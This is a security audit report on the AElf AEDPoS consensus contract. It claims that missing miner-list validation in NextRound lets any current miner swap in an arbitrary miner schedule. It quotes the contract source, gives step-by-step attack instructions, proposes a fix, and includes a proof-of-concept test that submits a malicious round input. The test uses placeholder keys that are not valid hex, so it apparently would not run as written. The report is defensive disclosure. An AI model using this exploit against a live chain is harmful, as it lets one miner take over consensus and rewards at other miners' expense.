# Audit Report

## Title
Missing Miner List Validation in NextRound Allows Consensus Schedule Corruption

## Summary
The AEDPoS consensus contract's `NextRound` validation logic fails to verify that the miner list in the provided round matches the current round's miner list. This allows any current miner to inject an arbitrary miner list during round transition, permanently corrupting the consensus schedule until the next term change.

## Finding Description

The AEDPoS consensus contract enforces a critical invariant: during `NextRound` transitions (as opposed to `NextTerm`), the miner list must remain identicalâ€”only the mining order should change. However, none of the validation providers enforce this invariant.

**Validation Gap Analysis:**

The `ValidationForNextRound` function only validates round number increment and null InValues, completely ignoring miner list consistency: [1](#0-0) 

The validation provider registration for `NextRound` behavior shows no miner list validator is included: [2](#0-1) 

`NextRoundMiningOrderValidationProvider` only validates internal consistency of the provided round, not whether its miners match the current round: [3](#0-2) 

`MiningPermissionValidationProvider` only checks if the sender is in the current round, not whether the provided round's miner list is valid: [4](#0-3) 

**Execution Without Validation:**

After passing incomplete validation, `ProcessNextRound` blindly converts the input and saves it to state without any miner list verification: [5](#0-4) 

The `ToRound()` conversion performs no validation whatsoever: [6](#0-5) 

**Expected vs. Actual Behavior:**

The legitimate round generation derives the next round's miners exclusively from the current round's miner set: [7](#0-6) 

This establishes that `NextRound` should preserve the miner set (keys in `RealTimeMinersInformation`), only reordering them. This is distinct from `NextTerm`, which explicitly updates the miner list: [8](#0-7) 

**Post-Execution Validation Failure (TOCTOU Issue):**

The post-execution validation retrieves the round from state (now containing the malicious round that was just saved) and compares it with the header, which match because they're both the malicious round: [9](#0-8) 

The public entry point is trivially reachable by any current miner: [10](#0-9) 

## Impact Explanation

This vulnerability enables **complete consensus takeover** by a single malicious miner:

1. **Consensus Schedule Corruption**: The attacker can arbitrarily modify who produces blocks in all subsequent rounds until `NextTerm`
2. **Unauthorized Block Production**: The attacker can add multiple controlled keys to dominate block production and rewards
3. **Miner Exclusion**: Legitimate miners can be removed, breaking their consensus participation and reward eligibility
4. **Cross-Chain Impact**: Other chains relying on this chain's consensus information receive corrupted data
5. **Persistence**: The corruption remains in effect for the entire term (potentially hundreds of rounds) until `NextTerm` naturally occurs

The impact is CRITICAL because:
- It breaks the fundamental trust assumption of the consensus mechanism
- A single compromised miner can seize majority control
- The attack succeeds silently with no immediate detection mechanism
- Recovery requires emergency intervention or waiting for the next term

## Likelihood Explanation

The likelihood is HIGH because:

**Attacker Prerequisites** (Minimal):
- Must be an existing miner in the current round (realistic scenario for compromised node)
- Must wait for their designated time slot (occurs naturally during operation)

**Attack Execution** (Trivial):
1. Craft `NextRoundInput` with `RoundNumber = CurrentRound + 1` (trivial)
2. Set all `InValue` fields to null (trivial)
3. Set `RealTimeMinersInformation` to arbitrary miner list (e.g., 10 copies of attacker's key, 0 legitimate miners)
4. Call public `NextRound` method during time slot
5. All validations pass because none check miner list consistency
6. Malicious round saved permanently to state

**No Defensive Barriers**:
- No alerts or monitoring for miner list manipulation
- No rate limiting or additional checks
- Other honest miners cannot prevent or revert the attack
- Would require chain reorganization or governance intervention to fix

The attack has near-certain success probability once executed by a miner in their time slot.

## Recommendation

Add a miner list consistency validation provider for `NextRound` behavior:

```csharp
public class MinerListConsistencyValidationProvider : IHeaderInformationValidationProvider
{
    public ValidationResult ValidateHeaderInformation(ConsensusValidationContext validationContext)
    {
        var baseRound = validationContext.BaseRound;
        var providedRound = validationContext.ProvidedRound;
        
        // Get miner public keys from both rounds
        var baseMiners = baseRound.RealTimeMinersInformation.Keys.OrderBy(k => k).ToList();
        var providedMiners = providedRound.RealTimeMinersInformation.Keys.OrderBy(k => k).ToList();
        
        // Verify same miner count
        if (baseMiners.Count != providedMiners.Count)
        {
            return new ValidationResult 
            { 
                Message = "NextRound miner count mismatch with current round." 
            };
        }
        
        // Verify exact same miners (order may differ)
        if (!baseMiners.SequenceEqual(providedMiners))
        {
            return new ValidationResult 
            { 
                Message = "NextRound miner list does not match current round. Use NextTerm to change miner list." 
            };
        }
        
        return new ValidationResult { Success = true };
    }
}
```

Register this provider in `AEDPoSContract_Validation.cs` for `NextRound` behavior:

```csharp
case AElfConsensusBehaviour.NextRound:
    validationProviders.Add(new MinerListConsistencyValidationProvider()); // Add this
    validationProviders.Add(new NextRoundMiningOrderValidationProvider());
    validationProviders.Add(new RoundTerminateValidationProvider());
    break;
```

## Proof of Concept

```csharp
[Fact]
public async Task NextRound_WithArbitraryMinerList_ShouldCorruptConsensus()
{
    // Setup: Initialize consensus with 3 legitimate miners
    var legitimateMiners = new[] { "MinerA", "MinerB", "MinerC" };
    await InitializeConsensusWithMiners(legitimateMiners);
    
    // Attacker is MinerA
    var attackerPubkey = "MinerA";
    
    // Get current round
    var currentRound = await ConsensusContract.GetCurrentRoundInformation.CallAsync(new Empty());
    Assert.Equal(3, currentRound.RealTimeMinersInformation.Count);
    
    // Craft malicious NextRoundInput with arbitrary miner list
    var maliciousInput = new NextRoundInput
    {
        RoundNumber = currentRound.RoundNumber + 1,
        TermNumber = currentRound.TermNumber,
        RealTimeMinersInformation = 
        {
            ["AttackerKey1"] = new MinerInRound { Pubkey = "AttackerKey1", Order = 1 },
            ["AttackerKey2"] = new MinerInRound { Pubkey = "AttackerKey2", Order = 2 },
            ["AttackerKey3"] = new MinerInRound { Pubkey = "AttackerKey3", Order = 3 }
        },
        RandomNumber = GenerateRandomNumber()
    };
    
    // Ensure all InValues are null (required by validation)
    foreach (var miner in maliciousInput.RealTimeMinersInformation.Values)
    {
        miner.InValue = null;
    }
    
    // Execute attack: Call NextRound as MinerA during time slot
    var result = await ConsensusContract.NextRound.SendAsync(maliciousInput);
    
    // Verify attack succeeded
    Assert.True(result.TransactionResult.Status == TransactionResultStatus.Mined);
    
    // Verify consensus is corrupted
    var corruptedRound = await ConsensusContract.GetCurrentRoundInformation.CallAsync(new Empty());
    Assert.Equal(maliciousInput.RoundNumber, corruptedRound.RoundNumber);
    Assert.Equal(3, corruptedRound.RealTimeMinersInformation.Count);
    
    // Verify legitimate miners are gone, attacker's keys are in
    Assert.False(corruptedRound.RealTimeMinersInformation.ContainsKey("MinerA"));
    Assert.False(corruptedRound.RealTimeMinersInformation.ContainsKey("MinerB"));
    Assert.False(corruptedRound.RealTimeMinersInformation.ContainsKey("MinerC"));
    Assert.True(corruptedRound.RealTimeMinersInformation.ContainsKey("AttackerKey1"));
    Assert.True(corruptedRound.RealTimeMinersInformation.ContainsKey("AttackerKey2"));
    Assert.True(corruptedRound.RealTimeMinersInformation.ContainsKey("AttackerKey3"));
    
    // Verify corruption persists in subsequent operations
    var minerList = await ConsensusContract.GetCurrentMinerList.CallAsync(new Empty());
    Assert.DoesNotContain(ByteStringHelper.FromHexString("MinerA"), minerList.Pubkeys);
    Assert.Contains(ByteStringHelper.FromHexString("AttackerKey1"), minerList.Pubkeys);
}
```

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/RoundTerminateValidationProvider.cs (L22-35)
```csharp
    private ValidationResult ValidationForNextRound(ConsensusValidationContext validationContext)
    {
        // Is next round information correct?
        // Currently two aspects:
        //   Round Number
        //   In Values Should Be Null
        var extraData = validationContext.ExtraData;
        if (validationContext.BaseRound.RoundNumber.Add(1) != extraData.Round.RoundNumber)
            return new ValidationResult { Message = "Incorrect round number for next round." };

        return extraData.Round.RealTimeMinersInformation.Values.Any(m => m.InValue != null)
            ? new ValidationResult { Message = "Incorrect next round information." }
            : new ValidationResult { Success = true };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L84-88)
```csharp
            case AElfConsensusBehaviour.NextRound:
                // Is sender's order of next round correct?
                validationProviders.Add(new NextRoundMiningOrderValidationProvider());
                validationProviders.Add(new RoundTerminateValidationProvider());
                break;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/NextRoundMiningOrderValidationProvider.cs (L9-25)
```csharp
    public ValidationResult ValidateHeaderInformation(ConsensusValidationContext validationContext)
    {
        // Miners that have determined the order of the next round should be equal to
        // miners that mined blocks during current round.
        var validationResult = new ValidationResult();
        var providedRound = validationContext.ProvidedRound;
        var distinctCount = providedRound.RealTimeMinersInformation.Values.Where(m => m.FinalOrderOfNextRound > 0)
            .Distinct().Count();
        if (distinctCount != providedRound.RealTimeMinersInformation.Values.Count(m => m.OutValue != null))
        {
            validationResult.Message = "Invalid FinalOrderOfNextRound.";
            return validationResult;
        }

        validationResult.Success = true;
        return validationResult;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/MiningPermissionValidationProvider.cs (L14-24)
```csharp
    public ValidationResult ValidateHeaderInformation(ConsensusValidationContext validationContext)
    {
        var validationResult = new ValidationResult();
        if (!validationContext.BaseRound.RealTimeMinersInformation.Keys.Contains(validationContext.SenderPubkey))
        {
            validationResult.Message = $"Sender {validationContext.SenderPubkey} is not a miner.";
            return validationResult;
        }

        validationResult.Success = true;
        return validationResult;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L108-159)
```csharp
    private void ProcessNextRound(NextRoundInput input)
    {
        var nextRound = input.ToRound();
        
        RecordMinedMinerListOfCurrentRound();

        TryToGetCurrentRoundInformation(out var currentRound);

        // Do some other stuff during the first time to change round.
        if (currentRound.RoundNumber == 1)
        {
            // Set blockchain start timestamp.
            var actualBlockchainStartTimestamp =
                currentRound.FirstActualMiner()?.ActualMiningTimes.FirstOrDefault() ??
                Context.CurrentBlockTime;
            SetBlockchainStartTimestamp(actualBlockchainStartTimestamp);

            // Initialize current miners' information in Election Contract.
            if (State.IsMainChain.Value)
            {
                var minersCount = GetMinersCount(nextRound);
                if (minersCount != 0 && State.ElectionContract.Value != null)
                {
                    State.ElectionContract.UpdateMinersCount.Send(new UpdateMinersCountInput
                    {
                        MinersCount = minersCount
                    });
                }
            }
        }

        if (State.IsMainChain.Value && // Only detect evil miners in Main Chain.
            currentRound.TryToDetectEvilMiners(out var evilMiners))
        {
            Context.LogDebug(() => "Evil miners detected.");
            foreach (var evilMiner in evilMiners)
            {
                Context.LogDebug(() =>
                    $"Evil miner {evilMiner}, missed time slots: {currentRound.RealTimeMinersInformation[evilMiner].MissedTimeSlots}.");
                // Mark these evil miners.
                State.ElectionContract.UpdateCandidateInformation.Send(new UpdateCandidateInformationInput
                {
                    Pubkey = evilMiner,
                    IsEvilNode = true
                });
            }
        }

        AddRoundInformation(nextRound);

        Assert(TryToUpdateRoundNumber(nextRound.RoundNumber), "Failed to update round number.");
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L161-221)
```csharp
    private void ProcessNextTerm(NextTermInput input)
    {
        var nextRound = input.ToRound();
        
        RecordMinedMinerListOfCurrentRound();

        // Count missed time slot of current round.
        CountMissedTimeSlots();

        Assert(TryToGetTermNumber(out var termNumber), "Term number not found.");

        // Update current term number and current round number.
        Assert(TryToUpdateTermNumber(nextRound.TermNumber), "Failed to update term number.");
        Assert(TryToUpdateRoundNumber(nextRound.RoundNumber), "Failed to update round number.");

        UpdateMinersCountToElectionContract(nextRound);

        // Reset some fields of first two rounds of next term.
        foreach (var minerInRound in nextRound.RealTimeMinersInformation.Values)
        {
            minerInRound.MissedTimeSlots = 0;
            minerInRound.ProducedBlocks = 0;
        }

        UpdateProducedBlocksNumberOfSender(nextRound);

        // Update miners list.
        var miners = new MinerList();
        miners.Pubkeys.AddRange(nextRound.RealTimeMinersInformation.Keys.Select(k => ByteStringHelper.FromHexString(k)));
        if (!SetMinerList(miners, nextRound.TermNumber)) Assert(false, "Failed to update miner list.");

        // Update term number lookup. (Using term number to get first round number of related term.)
        State.FirstRoundNumberOfEachTerm[nextRound.TermNumber] = nextRound.RoundNumber;

        // Update rounds information of next two rounds.
        AddRoundInformation(nextRound);

        if (!TryToGetPreviousRoundInformation(out var previousRound))
            Assert(false, "Failed to get previous round information.");

        UpdateCurrentMinerInformationToElectionContract(previousRound);

        if (DonateMiningReward(previousRound))
        {
            State.TreasuryContract.Release.Send(new ReleaseInput
            {
                PeriodNumber = termNumber
            });

            Context.LogDebug(() => $"Released treasury profit for term {termNumber}");
        }

        State.ElectionContract.TakeSnapshot.Send(new TakeElectionSnapshotInput
        {
            MinedBlocks = previousRound.GetMinedBlocks(),
            TermNumber = termNumber,
            RoundNumber = previousRound.RoundNumber
        });

        Context.LogDebug(() => $"Changing term number to {nextRound.TermNumber}");
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/NextRoundInput.cs (L25-40)
```csharp
    public Round ToRound()
    {
        return new Round
        {
            RoundNumber = RoundNumber,
            RealTimeMinersInformation = { RealTimeMinersInformation },
            ExtraBlockProducerOfPreviousRound = ExtraBlockProducerOfPreviousRound,
            BlockchainAge = BlockchainAge,
            TermNumber = TermNumber,
            ConfirmedIrreversibleBlockHeight = ConfirmedIrreversibleBlockHeight,
            ConfirmedIrreversibleBlockRoundNumber = ConfirmedIrreversibleBlockRoundNumber,
            IsMinerListJustChanged = IsMinerListJustChanged,
            RoundIdForValidation = RoundIdForValidation,
            MainChainMinersRoundNumber = MainChainMinersRoundNumber
        };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L11-71)
```csharp
    public void GenerateNextRoundInformation(Timestamp currentBlockTimestamp, Timestamp blockchainStartTimestamp,
        out Round nextRound, bool isMinerListChanged = false)
    {
        nextRound = new Round { IsMinerListJustChanged = isMinerListChanged };

        var minersMinedCurrentRound = GetMinedMiners();
        var minersNotMinedCurrentRound = GetNotMinedMiners();
        var minersCount = RealTimeMinersInformation.Count;

        var miningInterval = GetMiningInterval();
        nextRound.RoundNumber = RoundNumber + 1;
        nextRound.TermNumber = TermNumber;
        nextRound.BlockchainAge = RoundNumber == 1 ? 1 : (currentBlockTimestamp - blockchainStartTimestamp).Seconds;

        // Set next round miners' information of miners who successfully mined during this round.
        foreach (var minerInRound in minersMinedCurrentRound.OrderBy(m => m.FinalOrderOfNextRound))
        {
            var order = minerInRound.FinalOrderOfNextRound;
            nextRound.RealTimeMinersInformation[minerInRound.Pubkey] = new MinerInRound
            {
                Pubkey = minerInRound.Pubkey,
                Order = order,
                ExpectedMiningTime = currentBlockTimestamp.AddMilliseconds(miningInterval.Mul(order)),
                ProducedBlocks = minerInRound.ProducedBlocks,
                MissedTimeSlots = minerInRound.MissedTimeSlots
            };
        }

        // Set miners' information of miners missed their time slot in current round.
        var occupiedOrders = minersMinedCurrentRound.Select(m => m.FinalOrderOfNextRound).ToList();
        var ableOrders = Enumerable.Range(1, minersCount).Where(i => !occupiedOrders.Contains(i)).ToList();
        for (var i = 0; i < minersNotMinedCurrentRound.Count; i++)
        {
            var order = ableOrders[i];
            var minerInRound = minersNotMinedCurrentRound[i];
            nextRound.RealTimeMinersInformation[minerInRound.Pubkey] = new MinerInRound
            {
                Pubkey = minersNotMinedCurrentRound[i].Pubkey,
                Order = order,
                ExpectedMiningTime = currentBlockTimestamp
                    .AddMilliseconds(miningInterval.Mul(order)),
                ProducedBlocks = minerInRound.ProducedBlocks,
                // Update missed time slots count of one miner.
                MissedTimeSlots = minerInRound.MissedTimeSlots.Add(1)
            };
        }

        // Calculate extra block producer order and set the producer.
        var extraBlockProducerOrder = CalculateNextExtraBlockProducerOrder();
        var expectedExtraBlockProducer =
            nextRound.RealTimeMinersInformation.Values.FirstOrDefault(m => m.Order == extraBlockProducerOrder);
        if (expectedExtraBlockProducer == null)
            nextRound.RealTimeMinersInformation.Values.First().IsExtraBlockProducer = true;
        else
            expectedExtraBlockProducer.IsExtraBlockProducer = true;

        BreakContinuousMining(ref nextRound);

        nextRound.ConfirmedIrreversibleBlockHeight = ConfirmedIrreversibleBlockHeight;
        nextRound.ConfirmedIrreversibleBlockRoundNumber = ConfirmedIrreversibleBlockRoundNumber;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ACS4_ConsensusInformationProvider.cs (L83-128)
```csharp
    public override ValidationResult ValidateConsensusAfterExecution(BytesValue input)
    {
        var headerInformation = new AElfConsensusHeaderInformation();
        headerInformation.MergeFrom(input.Value);
        if (TryToGetCurrentRoundInformation(out var currentRound))
        {
            if (headerInformation.Behaviour == AElfConsensusBehaviour.UpdateValue)
                headerInformation.Round =
                    currentRound.RecoverFromUpdateValue(headerInformation.Round,
                        headerInformation.SenderPubkey.ToHex());

            if (headerInformation.Behaviour == AElfConsensusBehaviour.TinyBlock)
                headerInformation.Round =
                    currentRound.RecoverFromTinyBlock(headerInformation.Round,
                        headerInformation.SenderPubkey.ToHex());

            var isContainPreviousInValue = !currentRound.IsMinerListJustChanged;
            if (headerInformation.Round.GetHash(isContainPreviousInValue) !=
                currentRound.GetHash(isContainPreviousInValue))
            {
                var headerMiners = headerInformation.Round.RealTimeMinersInformation.Keys;
                var stateMiners = currentRound.RealTimeMinersInformation.Keys;
                var replacedMiners = headerMiners.Except(stateMiners).ToList();
                if (!replacedMiners.Any())
                    return new ValidationResult
                    {
                        Success = false, Message =
                            "Current round information is different with consensus extra data.\n" +
                            $"New block header consensus information:\n{headerInformation.Round}" +
                            $"Stated block header consensus information:\n{currentRound}"
                    };

                var newMiners = stateMiners.Except(headerMiners).ToList();
                var officialNewestMiners = replacedMiners.Select(miner =>
                        State.ElectionContract.GetNewestPubkey.Call(new StringValue { Value = miner }).Value)
                    .ToList();

                Assert(
                    newMiners.Count == officialNewestMiners.Count &&
                    newMiners.Union(officialNewestMiners).Count() == newMiners.Count,
                    "Incorrect replacement information.");
            }
        }

        return new ValidationResult { Success = true };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract.cs (L161-166)
```csharp
    public override Empty NextRound(NextRoundInput input)
    {
        SupplyCurrentRoundInformation();
        ProcessConsensusInformation(input);
        return new Empty();
    }
```
